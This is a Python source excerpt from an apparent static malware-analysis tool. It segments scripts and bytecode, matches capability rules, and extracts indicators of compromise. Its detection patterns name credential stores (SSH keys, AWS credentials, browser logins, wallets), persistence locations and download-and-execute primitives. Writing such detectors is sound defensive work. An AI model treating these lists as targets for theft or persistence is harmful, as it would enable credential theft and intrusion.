    Rule("PS-IEX", "ps1", "DYNAMIC_CODE", "high", r"\bIEX\b|Invoke-Expression|\[ScriptBlock\]::Create", "executes dynamic code"),
    Rule("PS-NET", "ps1", "NETWORK", "medium", r"Invoke-WebRequest|\biwr\b|Net\.WebClient|DownloadString|DownloadFile|Invoke-RestMethod", "downloads from {arg}"),
    Rule("ANY-PERSIST-STR", "*", "PERSISTENCE", "high", r"/etc/cron|\bcrontab\b|\.bashrc|\.profile\b|rc\.local|systemd/system|authorized_keys|CurrentVersion\\+Run|Start Menu\\+Programs\\+Startup|LaunchAgents", "references persistence location {arg}", "T-PERSIST"),
    Rule("ANY-CRED-STR", "*", "CREDENTIALS", "high", r"/etc/shadow|\bid_rsa\b|\.ssh/|\.aws/credentials|Login Data|cookies\.sqlite|\.git-credentials|wallet\.dat|\.kdbx|\bkeychain\b", "references credential store {arg}", "T-CRED-ACCESS"),
    Rule("ANY-RECON-STR", "*", "RECON", "low", r"/etc/passwd|/proc/version|/etc/os-release", "references {arg}"),
]
_LINE_RX = [(r, re.compile(r.pattern)) for r in LINE_RULES]


def _line_rules_for(text_lines: list[str], lang: str, layer_id: str, first_line: int = 1,
                    view: bool = False) -> list[tuple[int, Rule, str]]:
    """Run LINE_RULES over lines; returns [(lineno, rule, phrase)] in source order."""
    out: list[tuple[int, Rule, str]] = []
    for off, line in enumerate(text_lines):
        if len(line) > 4000:
            line = line[:4000]
        st = line.lstrip()
        if lang == "sh" and st.startswith("#"):
            continue
        for rule, rx in _LINE_RX:
            if rule.lang not in ("*", lang) and not (rule.lang == "sh" and lang == "text"):
                continue
            m = rx.search(line)
            if not m:
                continue
            gd = {k: v for k, v in m.groupdict().items() if v}
            arg = next(iter(gd.values()), None) or _snip(m.group(0), 50)
            out.append((first_line + off, rule, rule.phrase.format(arg=_snip(arg.strip(), 60), argv=_snip(arg.strip(), 60), callee=_snip(arg, 40))))
    return out


def _mk_block(layer: Layer, kind: str, name: str, start: int, end: int, hits: list[tuple[int, Rule, str, str]],
              calls: list[str], extra_actions: list[str] | None = None, deep: bool = False,
              view: bool = False, conf_override: str | None = None) -> Block:
    """Build a Block from rule hits [(line, rule, phrase, snippet)]."""
    actions: list[str] = []
    for _ln, _r, ph, _s in sorted(hits, key=lambda h: h[0]):
        if ph not in actions:
            actions.append(ph)
    for e in extra_actions or []:
        if e not in actions:
            actions.append(e)
    cats = sorted({r.category for _l, r, _p, _s in hits if r.severity != "info" or True}, key=CATEGORIES.index)
    pre = layer.id + ("v" if view else "")
    ev = [Evidence(f"{pre}:{ln}", _snip(sn, 120), r.id) for ln, r, _p, sn in hits][:50]
    shown = actions if deep else actions[:6]
    more = "" if deep or len(actions) <= 6 else f"; +{len(actions) - 6} more"
    if not actions:
        body = "no notable operations (pure computation / glue)"
    else:
        body = "; ".join(shown) + more
    cl = calls[:6]
    summary = f"{kind} `{name}` ({pre}:{start}-{end}): {body}." if name else f"{kind} ({pre}:{start}-{end}): {body}."
    if cl:
        summary += " calls: " + ", ".join(f + "()" for f in cl)
    conf = conf_override or ("medium" if any(r.pattern and not r.id.startswith(("PY-", "ANY-")) for _l, r, _p, _s in hits) and layer.lang != "py" else "high")
    if layer.lang == "py":
        conf = conf_override or "high"
    return Block(layer.id, kind, name, start, end, cats, actions, cl, ev, summary, conf)


# ---------- Python annotator
class _PyCtx:
    def __init__(self, tree: ast.Module, text: str, folder: PyFolder) -> None:
        self.tree, self.text, self.folder = tree, text, folder
        self.aliases: dict[str, str] = {}
        self.imported: set[str] = set()
        self.defs = {n.name for n in tree.body if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef))}
        for n in ast.walk(tree):
            if isinstance(n, ast.Import):
                for a in n.names:
                    self.aliases[a.asname or a.name.split(".")[0]] = a.name if a.asname else a.name.split(".")[0]
                    self.imported.add(a.name.split(".")[0])
            elif isinstance(n, ast.ImportFrom) and n.module:
                self.imported.add(n.module.split(".")[0])
                for a in n.names:
                    self.aliases[a.asname or a.name] = f"{n.module}.{a.name}"

    def qual(self, f: ast.expr) -> str | None:
        """Dotted callee with import aliases resolved ('s.socket' -> 'socket.socket')."""
        if isinstance(f, ast.Name):
            if f.id in self.aliases:
                return self.aliases[f.id]
            if f.id in _BUILTIN_NAMES or f.id in ("raw_input",):
                return f.id if f.id == "raw_input" else "builtins." + f.id
            return None
        if isinstance(f, ast.Attribute):
            b = self.qual(f.value)
            return f"{b}.{f.attr}" if b else None
        if isinstance(f, ast.Call):
            nm = self.folder.callee_name(f.func)
            return None if nm is None else nm
        return None

    def arg_text(self, call: ast.Call, idx: int = 0) -> str:
        if len(call.args) <= idx:
            return "<none>"
        v = self.folder.fold(call.args[idx])
        if isinstance(v, (str, bytes)):
            return _snip(v.decode("utf-8", "replace") if isinstance(v, bytes) else v, 60)
        if isinstance(v, (tuple, list)) and all(isinstance(x, (str, int)) for x in v):
            return _snip(repr(tuple(v)) if isinstance(v, tuple) else repr(v), 60)
        if isinstance(v, int):
            return str(v)
        a0 = call.args[idx]
        if isinstance(a0, ast.Call) and a0.args:
            v2 = self.folder.fold(a0.args[0])
            if isinstance(v2, str):
                return _snip(v2, 60)
        return "<dynamic>"


def _py_call_hits(ctx: _PyCtx, node: ast.AST, layer: Layer, rules_seen: set) -> list[tuple[int, Rule, str, str]]:
    out: list[tuple[int, Rule, str, str]] = []
    text_lines = ctx.text.split("\n")
    for call in ast.walk(node):
        if not isinstance(call, ast.Call):
            continue
        q = ctx.qual(call.func)
        ln = getattr(call, "lineno", 1)
        snip = text_lines[ln - 1] if 0 < ln <= len(text_lines) else ""
        if q:
            for r in PY_CALL_RULES:
                if any(fnmatch.fnmatchcase(q, p) for p in r.pattern.split("|")):
                    if r.id == "PY-ENCODE" and False:
                        continue
                    ph = r.phrase.format(arg=ctx.arg_text(call), callee=q)
                    cat, rule = r.category, r
                    if r.id == "PY-OPEN-R":
                        mode = ctx.folder.fold(call.args[1]) if len(call.args) > 1 else next(
                            (ctx.folder.fold(k.value) for k in call.keywords if k.arg == "mode"), "r")
                        if isinstance(mode, str) and re.search(r"[wax+]", mode):
                            rule = Rule("PY-OPEN-W", "py", "FILE_WRITE", "medium", r.pattern, "writes file {arg}")
                            ph = f"writes file {ctx.arg_text(call)}"
                    out.append((ln, rule, ph, snip))
                    if rule.id == "PY-SOCKET":
                        pass
                    break
        if isinstance(call.func, ast.Attribute):
            for rid, mod, rx, cat, sev, phrase in PY_METHOD_RULES:
                if mod in ctx.imported and re.fullmatch(rx, call.func.attr) and not (q and q.startswith(("builtins.", "base64.", "os.", "zlib."))):
                    if rid == "PY-SOCKET" or True:
                        out.append((ln, Rule(rid, "py", cat, sev, rx, phrase), phrase.format(arg=ctx.arg_text(call)), snip))
                        break
    # string rules (persistence/credential/recon paths in string constants)
    for n in ast.walk(node):
        if isinstance(n, ast.Constant) and isinstance(n.value, str) and len(n.value) < 400:
            for rule, rx in _LINE_RX:
                if rule.lang == "*":
                    m = rx.search(n.value)
                    if m:
                        ln = getattr(n, "lineno", 1)
                        out.append((ln, rule, rule.phrase.format(arg=_snip(n.value, 60)), text_lines[ln - 1] if 0 < ln <= len(text_lines) else ""))
    # XOR in comprehension / loop over data
    for n in ast.walk(node):
        if isinstance(n, (ast.ListComp, ast.GeneratorExp, ast.For)) and any(
                isinstance(b, ast.BinOp) and isinstance(b.op, ast.BitXor) for b in ast.walk(n)):
            ln = getattr(n, "lineno", 1)
            out.append((ln, Rule("PY-CRYPTO", "py", "CRYPTO", "low", "", "XORs data with {key}"), "XORs data with a key/constant", text_lines[ln - 1] if 0 < ln <= len(text_lines) else ""))
        if isinstance(n, ast.Compare) and any(isinstance(o, (ast.Eq, ast.NotEq)) for o in n.ops) and any(
                isinstance(c, (ast.Name, ast.List, ast.Constant, ast.Subscript, ast.Call)) for c in n.comparators):
            ln = getattr(n, "lineno", 1)
            if any(isinstance(x, ast.Name) and x.id in ctx.input_names for x in ast.walk(n)):
                out.append((ln, Rule("PY-COMPARE", "py", "COMPARE_CHECK", "info", "", "compares input with constant"), "compares input transform with constant", text_lines[ln - 1] if 0 < ln <= len(text_lines) else ""))
    # dedupe identical (line, rule, phrase)
    seen: set = set()
    res = []
    for h in out:
        k = (h[0], h[1].id, h[2])
        if k not in seen:
            seen.add(k)
            res.append(h)
    return res


def _py_calls_in(ctx: _PyCtx, node: ast.AST) -> list[str]:
    out: list[str] = []
    for n in ast.walk(node):
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in ctx.defs and n.func.id not in out:
            out.append(n.func.id)
    return out


def _py_input_names(tree: ast.Module) -> set[str]:
    names: set[str] = set()
    for fn in ast.walk(tree):
        if isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            names |= {a.arg for a in fn.args.args}
    for n in ast.walk(tree):
        if isinstance(n, ast.Assign) and len(n.targets) == 1 and isinstance(n.targets[0], ast.Name):
            src = ast.dump(n.value)
            if re.search(r"id='(input|raw_input)'|sys.*argv|stdin|getpass", src):
                names.add(n.targets[0].id)
    return names


def _annotate_py(layer: Layer, opts: Options, report: Report) -> None:
    text = layer.text or ""
    try:
        tree = ast.parse(text)
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        _annotate_generic(layer, opts, report)
        return
    folder = layer.meta.get("_folder")
    if not isinstance(folder, PyFolder):
        folder = PyFolder(tree)
        folder.build_env()
    ctx = _PyCtx(tree, text, folder)
    ctx.input_names = _py_input_names(tree)  # type: ignore[attr-defined]
    body = tree.body
    blocks: list[Block] = []
    imports = [n for n in body if isinstance(n, (ast.Import, ast.ImportFrom))]
    if imports:
        mods = []
        for n in imports:
            mods += [a.name for a in n.names] if isinstance(n, ast.Import) else [n.module or ""]
        cats = {"socket": "NETWORK", "subprocess": "EXEC", "os": "EXEC", "ctypes": "MEMORY_EXEC", "base64": "ENCODING",
                "hashlib": "CRYPTO", "requests": "NETWORK", "urllib": "NETWORK", "pickle": "DYNAMIC_LOAD", "marshal": "DYNAMIC_LOAD",
                "zlib": "ENCODING", "winreg": "PERSISTENCE", "pty": "EXEC"}
        key = [m for m in dict.fromkeys(mods) if m.split(".")[0] in cats]
        blocks.append(Block(layer.id, "imports", "", imports[0].lineno, imports[-1].end_lineno or imports[-1].lineno,
                            sorted({cats[m.split(".")[0]] for m in key}, key=CATEGORIES.index),
                            [f"imports {', '.join(dict.fromkeys(mods))}"], [], [],
                            f"imports ({layer.id}:{imports[0].lineno}-{imports[-1].end_lineno}): imports {', '.join(dict.fromkeys(mods))}.", "high"))
    run: list[ast.stmt] = []

    def flush() -> None:
        if not run:
            return
        chunks: list[list[ast.stmt]] = [[]]
        for st in run:
            if chunks[-1] and (st.lineno - (chunks[-1][0].lineno) > 40):
                chunks.append([])
            chunks[-1].append(st)
        for ch in chunks:
            a, b = ch[0].lineno, ch[-1].end_lineno or ch[-1].lineno
            hits: list[tuple[int, Rule, str, str]] = []
            extra: list[str] = []
            for st in ch:
                hits += _py_call_hits(ctx, st, layer, set())
                if isinstance(st, ast.Assign) and len(st.targets) == 1 and isinstance(st.targets[0], ast.Name):
                    v = folder.fold(st.value)
                    nm = st.targets[0].id
                    if isinstance(v, (str, bytes)) and len(v) < 80:
                        extra.append(f"defines {nm} = {_snip(repr(v), 50)}")
                    elif isinstance(v, (list, tuple)):
                        extra.append(f"defines {nm} ({len(v)} {'ints' if all(isinstance(x, int) for x in v) else 'items'})")
            blocks.append(_mk_block(layer, "top-level", "", a, b, [(l, r, p, s) for l, r, p, s in hits], _py_calls_in(ctx, ast.Module(body=ch, type_ignores=[])), extra, opts.deep))
        run.clear()

    for st in body:
        if isinstance(st, (ast.Import, ast.ImportFrom)):
            continue
        if isinstance(st, (ast.FunctionDef, ast.AsyncFunctionDef)):
            flush()
            hits = _py_call_hits(ctx, st, layer, set())
            blocks.append(_mk_block(layer, "function", st.name, st.lineno, st.end_lineno or st.lineno, hits,
                                    [c for c in _py_calls_in(ctx, st) if c != st.name], None, opts.deep))
        elif isinstance(st, ast.ClassDef):
            flush()
            blocks.append(_mk_block(layer, "class", st.name, st.lineno, st.end_lineno or st.lineno,
                                    _py_call_hits(ctx, st, layer, set()), _py_calls_in(ctx, st), None, opts.deep))
            for m in st.body:
                if isinstance(m, (ast.FunctionDef, ast.AsyncFunctionDef)):
                    blocks.append(_mk_block(layer, "method", f"{st.name}.{m.name}", m.lineno, m.end_lineno or m.lineno,
                                            _py_call_hits(ctx, m, layer, set()), _py_calls_in(ctx, m), None, opts.deep))
        elif isinstance(st, ast.If) and isinstance(st.test, ast.Compare) and isinstance(st.test.left, ast.Name) \
                and st.test.left.id == "__name__":
            flush()
            blocks.append(_mk_block(layer, "main-guard", "", st.lineno, st.end_lineno or st.lineno,
                                    _py_call_hits(ctx, st, layer, set()), _py_calls_in(ctx, st), None, opts.deep))
        else:
            run.append(st)
    flush()
    # per-function input / compare check marks
    for b in blocks:
        if b.kind in ("function", "main-guard", "top-level") and any(
                a.startswith("compares input") for a in b.actions) and "COMPARE_CHECK" not in b.categories:
            b.categories.append("COMPARE_CHECK")
    # flow line
    flow_cats: list[str] = []
    mains = [b for b in blocks if b.kind == "main-guard"] or [b for b in blocks if b.kind == "top-level"]
    by_name = {b.name: b for b in blocks if b.kind == "function"}
    seen_fn: set[str] = set()

    def follow(b: Block, d: int) -> None:
        for c in b.categories:
            if c not in ("ENCODING", "OUTPUT") or c not in flow_cats:
                if c not in flow_cats:
                    flow_cats.append(c)
        if d < 3:
            for cn in b.calls:
                if cn in by_name and cn not in seen_fn:
                    seen_fn.add(cn)
                    follow(by_name[cn], d + 1)
    for b in mains:
        follow(b, 0)
    layer.meta["flow_cats"] = flow_cats
    report.blocks.extend(blocks)
    # rule-driven tells
    for b in blocks:
        for e in b.evidence:
            rule = next((r for r in PY_CALL_RULES + LINE_RULES if r.id == e.rule), None)
            tid = (rule.tell if rule and rule.tell else None)
            if tid is None and rule and rule.category in _PY_TELL_BY_CAT and rule.severity in ("high", "medium"):
                tid = _PY_TELL_BY_CAT[rule.category]
            if tid:
                _add_tell(report, tid, e.loc, rule.phrase.split("{")[0].strip() or rule.id, e.snippet, "high" if rule and rule.id.startswith("PY-") else "medium")
    _py_measures(layer, tree, ctx, report)
    _py_clean_view(layer, tree, folder, opts, report)


def _py_measures(layer: Layer, tree: ast.Module, ctx: _PyCtx, report: Report) -> None:
    idents: set[str] = set()
    for n in ast.walk(tree):
        if isinstance(n, ast.Name):
            idents.add(n.id)
        elif isinstance(n, ast.arg):
            idents.add(n.arg)
        elif isinstance(n, (ast.FunctionDef, ast.ClassDef, ast.AsyncFunctionDef)):
            idents.add(n.name)
    idents -= set(dir(__builtins__) if not isinstance(__builtins__, dict) else __builtins__.keys())
    layer.meta["idents"] = sorted(idents)
    _measure_text(layer, report, idents)
    for n in ast.walk(tree):
        if isinstance(n, (ast.List, ast.Tuple)) and len(n.elts) >= 8 and all(isinstance(e, ast.Constant) and isinstance(e.value, int) and not isinstance(e.value, bool) for e in n.elts):
            vals = [e.value for e in n.elts]
            if all(0 <= v <= 0x10FFFF for v in vals):
                s = "".join(chr(v) for v in vals)
                if decode.printable_ratio(s.encode("utf-8", "replace")) >= 0.9:
                    _add_tell(report, "T-CHARCODE-ARRAY", f"{layer.id}:{n.lineno}", "char-code array decodes to text", _snip(s, 80), "medium", "low")
                    _merge_iocs(report, extract_iocs(s, f"{layer.id}:{n.lineno}"[:-len(str(n.lineno)) - 1] if False else layer.id, FLAG_RE, ("decoded",)))
            if len(vals) >= 4:
                try:
                    packed = bytes(vals) if all(v < 256 for v in vals) else b"".join(struct.pack("<I", v & 0xFFFFFFFF) for v in vals)
                except (ValueError, struct.error):
                    packed = b""
                for h in scan_crypto_constants(packed):
                    if h["offset"] == 0 and h["name"] not in ("Base64 alphabet",):
                        _add_tell(report, "T-CHECKER" if False else "T-LONG-LITERAL", f"{layer.id}:{n.lineno}", f"table literal: {h['name']}", "", h["confidence"], "info")
                        report.metrics.setdefault("crypto_script", []).append({**h, "loc": f"{layer.id}:{n.lineno}"})
        if isinstance(n, ast.Constant) and isinstance(n.value, int) and n.value in (0x9e3779b9, 0x61c88647, 0xedb88320, 0x811c9dc5):
            report.metrics.setdefault("crypto_script", []).append({"name": {0x9e3779b9: "TEA/XTEA delta", 0x61c88647: "TEA/XTEA delta", 0xedb88320: "CRC32 poly", 0x811c9dc5: "FNV-1 32"}[n.value], "offset": 0, "loc": f"{layer.id}:{n.lineno}", "confidence": "low", "tag": "imm"})
        if isinstance(n, ast.Call):
            nm = ctx.qual(n.func)
            if nm == "builtins.getattr" and len(n.args) >= 2 and not isinstance(n.args[1], ast.Constant):
                r = ctx.folder.fold(n.args[1])
                _add_tell(report, "T-GETATTR-STRING", f"{layer.id}:{n.lineno}", "attribute resolved from computed string", f"resolves to {r!r}" if isinstance(r, str) else "unresolved", "medium")
            if nm in ("builtins.__import__", "importlib.import_module"):
                _add_tell(report, "T-IMPORT-DYNAMIC", f"{layer.id}:{n.lineno}", "dynamic import", "", "medium")
            if nm == "time.sleep" and n.args:
                v = ctx.folder.fold(n.args[0])
                if isinstance(v, (int, float)) and v >= 30:
                    _add_tell(report, "T-SLEEP", f"{layer.id}:{n.lineno}", f"sleeps {v}s", "", "medium")
    for ln, s in layer.meta.get("decoded_literals", []):
        _merge_iocs(report, extract_iocs(s, layer.id, FLAG_RE, ("decoded",)))


def _py_clean_view(layer: Layer, tree: ast.Module, folder: PyFolder, opts: Options, report: Report) -> None:
    """Presentation-only cleaned source: closed foldable expressions become constants."""
    if not (opts.deep or opts.dump_dir):
        return

    class T(ast.NodeTransformer):
        def visit(self, node: ast.AST) -> ast.AST:
            if isinstance(node, (ast.BinOp, ast.Call, ast.Subscript, ast.JoinedStr)):
                v = folder.fold(node)
                if isinstance(v, (str, bytes, int)) and not isinstance(v, bool) and len(v) <= 4096 if isinstance(v, (str, bytes)) else (
                        isinstance(v, int) and not isinstance(v, bool)):
                    if not (isinstance(node, ast.Call) and not isinstance(v, (str, bytes))):
                        return ast.copy_location(ast.Constant(value=str(v) if isinstance(v, TStr) else (bytes(v) if isinstance(v, TBytes) else v)), node)
            return self.generic_visit(node)
    try:
        new = T().visit(ast.parse(layer.text or ""))
        ast.fix_missing_locations(new)
        src = ast.unparse(new)
        if opts.rename:
            names = [n for n in layer.meta.get("idents", []) if _rename_like(n)]
            mp = {n: f"var_{i + 1}" for i, n in enumerate(names)}
            src = re.sub(r"\b(" + "|".join(map(re.escape, mp)) + r")\b", lambda m: mp[m.group(1)], src) if mp else src
        layer.meta["clean"] = src
    except Exception as exc:  # noqa: BLE001
        report.notes.append(f"{layer.id}: cleaned view unavailable ({type(exc).__name__})")


# ---------- generic / JS / shell / pyc / pickle annotators
def _segment_js(layer: Layer, lines: list[str], toks: list[Tok]) -> list[tuple[str, str, int, int]]:
    segs: list[tuple[str, str, int, int]] = []
    n = len(toks)
    i = 0
    covered_to = 0
    while i < n:
        t = toks[i]
        kind = name = None
        end_i = i
        if t.kind == "ident" and t.value == "function" and i + 1 < n and toks[i + 1].kind == "ident":
            kind, name = "function", toks[i + 1].value
        elif t.kind == "ident" and t.value in ("const", "let", "var") and i + 3 < n and toks[i + 1].kind == "ident" and toks[i + 2].value == "=" and (
                toks[i + 3].value == "function" or toks[i + 3].value == "(" or toks[i + 3].value == "async"):
            kind, name = "function", toks[i + 1].value
        elif t.kind == "ident" and t.value == "class" and i + 1 < n:
            kind, name = "class", toks[i + 1].value
        elif t.value == "(" and i + 1 < n and toks[i + 1].value in ("function", "(", "async") and (i == 0 or toks[i - 1].value in (";", "}", "{", ")")):
            kind, name = "iife", ""
        if kind:
            j = i
            while j < n and toks[j].value not in ("{", "(" if kind == "iife" else "{"):
                j += 1
            if kind == "iife":
                j = _js_match(toks, i)
                end_i = j
                if j + 1 < n and toks[j + 1].value == "(":
                    end_i = _js_match(toks, j + 1)
            elif j < n:
                end_i = _js_match(toks, j)
            else:
                end_i = n - 1
            segs.append((kind, name or "", t.line, toks[end_i].line))
            i = end_i + 1
            continue
        i += 1
    return segs


def _annotate_generic(layer: Layer, opts: Options, report: Report, lang: str | None = None) -> None:
    lang = lang or layer.lang
    text = layer.view if (layer.view and lang == "js") else (layer.text or "")
    view = bool(layer.view and lang == "js")
    lines = text.split("\n")
    segs: list[tuple[str, str, int, int, float]] = []  # kind, name, start, end, conf
    if lang == "js":
        toks = layer.meta.get("_toks") or js_tokenize(layer.view or text)
        if view:
            toks = js_tokenize(layer.view)
        for kind, name, a, b in _segment_js(layer, lines, toks):
            segs.append((kind, name, a, b, 1))
        used = [(a, b) for _k, _n, a, b, _c in segs]
        # remaining top-level statement runs
        cur = None
        for ln in range(1, len(lines) + 1):
            inside = any(a <= ln <= b for a, b in used)
            if not inside and lines[ln - 1].strip():
                cur = ln if cur is None else cur
                last = ln
            elif cur is not None:
                segs.append(("top-level", "", cur, last, 1))
                cur = None
        if cur is not None:
            segs.append(("top-level", "", cur, last, 1))
    elif lang == "sh":
        i = 0
        L = len(lines)
        while i < L:
            s = lines[i].strip()
            m = re.match(r"(?:function\s+)?(\w+)\s*(?:\(\s*\))?\s*\{\s*$", s)
            kind = None
            if m and (s.endswith("{")) and (s.startswith("function") or "()" in s):
                kind, name, closer = "shell-function", m.group(1), re.compile(r"^\}")
            elif re.match(r"(if|case)\b", s):
                kind, name, closer = "conditional", "", re.compile(r"^(fi|esac)\b")
            elif re.match(r"(for|while|until)\b", s):
                kind, name, closer = "loop", "", re.compile(r"^done\b")
            if kind:
                depth, j = 0, i
                opener = {"conditional": re.compile(r"^(if|case)\b"), "loop": re.compile(r"^(for|while|until)\b"), "shell-function": re.compile(r"\{\s*$")}[kind]
                while j < L:
                    sj = lines[j].strip()
                    if opener.search(sj):
                        depth += 1
                    if closer.match(sj):
                        depth -= 1
                        if depth <= 0:
                            break
                    j += 1
                segs.append((kind, name, i + 1, min(j + 1, L), 1))
                i = j + 1
                continue
            i += 1
        used = [(a, b) for _k, _n, a, b, _c in segs]
        cur = None
        last = 0
        for ln in range(1, L + 1):
            inside = any(a <= ln <= b for a, b in used)
            blank = not lines[ln - 1].strip()
            if not inside and not blank:
                cur = ln if cur is None else cur
                last = ln
            elif (blank or inside) and cur is not None:
                segs.append(("top-level", "", cur, last, 0))
                cur = None
        if cur is not None:
            segs.append(("top-level", "", cur, last, 0))
    else:
        cur, last = None, 0
        for ln in range(1, len(lines) + 1):
            if lines[ln - 1].strip():
                cur = ln if cur is None else cur
                last = ln
            elif cur is not None:
                segs.append(("top-level", "", cur, last, 0))
                cur = None
        if cur is not None:
            segs.append(("top-level", "", cur, last, 0))
    segs.sort(key=lambda s: s[2])
    fn_names = [s[1] for s in segs if s[0] in ("function", "shell-function") and s[1]]
    blocks: list[Block] = []
    for kind, name, a, b, c in segs[:MAX_FINDINGS]:
        rng = lines[a - 1:b]
        raw = _line_rules_for(rng, lang, layer.id, a, view)
        hits = [(ln, r, p, lines[ln - 1] if 0 < ln <= len(lines) else "") for ln, r, p in raw]
        # a string rule inside an already matched call does not double count
        calls = [f for f in fn_names if f != name and re.search(r"(?<![\w.])" + re.escape(f) + r"\s*\(" if lang != "sh" else r"(?<![\w.-])" + re.escape(f) + r"(?![\w-])", "\n".join(rng))]
        blocks.append(_mk_block(layer, kind, name, a, b, hits, calls, None, opts.deep, view, "low" if c == 0 and lang in ("sh", "ps1", "text", "html") else None))
    report.blocks.extend(blocks)
    pre = layer.id + ("v" if view else "")
    for bl in blocks:
        for e in bl.evidence:
            rule = next((r for r in LINE_RULES if r.id == e.rule), None)
            if rule is None:
                continue
            tid = rule.tell
            if tid is None and rule.category in _PY_TELL_BY_CAT and rule.severity in ("high", "medium"):
                tid = _PY_TELL_BY_CAT[rule.category]
            if tid is None and rule.id in ("JS-EVAL", "PS-IEX"):
                tid = None
            if tid:
                _add_tell(report, tid, e.loc, rule.phrase.split("{")[0].strip() or rule.id, e.snippet, "high" if rule.severity == "high" else "medium")
    flow: list[str] = []
    for bl in blocks:
        if bl.kind in ("top-level", "iife") or lang == "sh":
            for c in bl.categories:
                if c not in flow and c != "OUTPUT":
                    flow.append(c)
    layer.meta["flow_cats"] = flow
    idents = {t.value for t in (layer.meta.get("_toks") or []) if t.kind == "ident"} if lang == "js" else set(re.findall(r"\b[A-Za-z_]\w*\b", text[:200000]))
    _measure_text(layer, report, idents if lang == "js" else set())
    if lang == "js":
        _js_checker(layer, report)


def _annotate_pyc(layer: Layer, opts: Options, report: Report) -> None:
    cos = layer.meta.get("code_objects", [])
    for co in cos:
        names = set(co.get("names", []))
        strs = co.get("consts_str", [])
        acts: list[str] = []
        cats: list[str] = []
        ev: list[Evidence] = []
        hits: list[tuple[int, Rule, str, str]] = []
        if "socket" in names and ({"connect", "connect_ex"} & names):
            hits.append((co.get("firstlineno", 0), Rule("PY-SOCKET", "py", "NETWORK", "medium", "", ""), "connects (socket.connect)", "names: socket, connect"))
        if {"system", "popen", "Popen", "call", "run", "check_output"} & names and ({"os", "subprocess"} & names):
            hits.append((co.get("firstlineno", 0), Rule("PY-SUBPROC", "py", "EXEC", "medium", "", ""), "runs command", "names: " + ",".join(sorted(names & {"system", "popen", "Popen", "os", "subprocess"}))))
        if {"exec", "eval"} & names:
            hits.append((co.get("firstlineno", 0), Rule("PY-EXEC-DYN", "py", "DYNAMIC_CODE", "high", "", ""), "executes dynamic code", "names: exec/eval"))
        for s in strs:
            for rule, rx in _LINE_RX:
                if rule.lang == "*" and rx.search(s):
                    hits.append((co.get("firstlineno", 0), rule, rule.phrase.format(arg=_snip(s, 40)), s))
        b = _mk_block(layer, "code-object", co.get("qualname") or co.get("name", ""), co.get("firstlineno", 0), co.get("firstlineno", 0), hits, [], None, opts.deep)
        if opts.deep and co.get("dis"):
            b.summary += "\n" + "\n".join("      " + x for x in co["dis"].splitlines()[:60])
        report.blocks.append(b)
        for s in strs:
            _merge_iocs(report, extract_iocs(s, layer.id, _flag_re(report)))
        for e in b.evidence:
            rule = next((r for r in PY_CALL_RULES + LINE_RULES if r.id == e.rule), None)
            if rule and rule.tell:
                _add_tell(report, rule.tell, e.loc, rule.id, e.snippet, "medium")
    for s in layer.meta.get("raw_strings", []):
        _merge_iocs(report, extract_iocs(s, layer.id, _flag_re(report), ("from-binary",)))
    if not cos and layer.meta.get("raw_strings"):
        report.blocks.append(Block(layer.id, "code-object", "", 0, 0, [], [f"raw string scan: {len(layer.meta['raw_strings'])} strings"], [], [],
                                   f"code-object (raw strings): {len(layer.meta['raw_strings'])} strings extracted (bytecode not disassembled).", "low"))


def _annotate_pickle(layer: Layer, opts: Options, report: Report) -> None:
    info = layer.meta.get("pickle")
    if not info:
        return
    acts: list[str] = []
    cats: list[str] = []
    for cal, args in info["calls"]:
        acts.append(f"imports callable {cal}")
        acts.append(f"calls {cal}({', '.join(repr(a) for a in args[-2:])})")
        if cal.split(".")[0] in ("os", "subprocess", "posix", "nt", "pty"):
            cats.append("EXEC")
        if cal.endswith(("exec", "eval")):
            cats.append("DYNAMIC_CODE")
    summ = f"top-level `pickle` ({layer.id}:1-1): " + ("; ".join(dict.fromkeys(acts)) or "no callable invocations") + "."
    if opts.deep:
        summ += "\n" + "\n".join("      " + x for x in _pickle_listing(layer.data).splitlines())
    report.blocks.append(Block(layer.id, "top-level", "pickle", 1, 1, sorted(set(cats), key=CATEGORIES.index), list(dict.fromkeys(acts)), [], [], summ, "high"))
    for s in info["strings"]:
        _merge_iocs(report, extract_iocs(s, layer.id, _flag_re(report)))


def _flag_re(report: Report) -> re.Pattern:
    return report.metrics.get("flag_re") or FLAG_RE


def annotate_layer(layer: Layer, opts: Options, report: Report) -> None:
    """Segment ``layer`` into labelled parts, run capability rules, collect tells/IOCs/checkers."""
    fre = _flag_re(report)
    if layer.lang == "pyc":
        if "marshal" not in layer.meta and "raw_strings" not in layer.meta:
            _pyc_prepare(layer, report)
        _annotate_pyc(layer, opts, report)
        return
    if layer.lang == "blob" and layer.meta.get("pickle"):
        _annotate_pickle(layer, opts, report)
        return
    if layer.text is None:
        return
    if layer.lang == "py":
        _annotate_py(layer, opts, report)
        _stage(report, f"checker-{layer.id}", _py_checkers, layer, report)
    elif layer.lang in ("js", "sh", "ps1", "html", "text"):
        _annotate_generic(layer, opts, report)
    else:
        _annotate_generic(layer, opts, report, "text")


def _scan_layer(layer: Layer, report: Report, opts: Options) -> None:
    """Tells + IOCs for every layer (wrappers carry tells too)."""
    fre = _flag_re(report)
    if layer.text is None:
        return
    text = layer.view if (layer.view and layer.lang == "js") else layer.text
    pre = layer.id
    iocs = extract_iocs(text, pre, fre)
    # reversed copies of long literals
    for m in re.finditer(r"""(['"])([^'"\n]{16,300})\1""", layer.text[:IOC_SCAN_CAP]):
        for i in extract_iocs(m.group(2)[::-1], pre, fre, ("reversed",)):
            if i.type in ("url", "flag"):
                i.confidence = "medium" if i.type == "flag" else i.confidence
                i.loc = f"{pre}:{_line_of(layer.text, m.start())}"
                iocs.append(i)
    _merge_iocs(report, iocs)
    for i in iocs:
        if i.type in ("ip", "ip_port") and not ({"private", "loopback", "link-local"} & set(i.tags)) and "multicast" not in i.tags:
            _add_tell(report, "T-HARDCODED-IP", i.loc, "hard-coded IP address", i.value, "medium")
        if i.type in ("secret_assign", "key_pem", "aws_key", "jwt", "tg_token"):
            _add_tell(report, "T-HARDCODED-SECRET", i.loc, f"hard-coded {i.type}", i.value[:40], "medium")
    for h in scan_crypto_constants(layer.text.encode("utf-8", "replace")[:IOC_SCAN_CAP]):
        if h.get("tag") == "T-CUSTOM-B64":
            _add_tell(report, "T-CUSTOM-B64", f"{pre}:{_line_of(layer.text, h['offset'])}", "non-standard base64 alphabet", "custom alphabet permutation", "high")
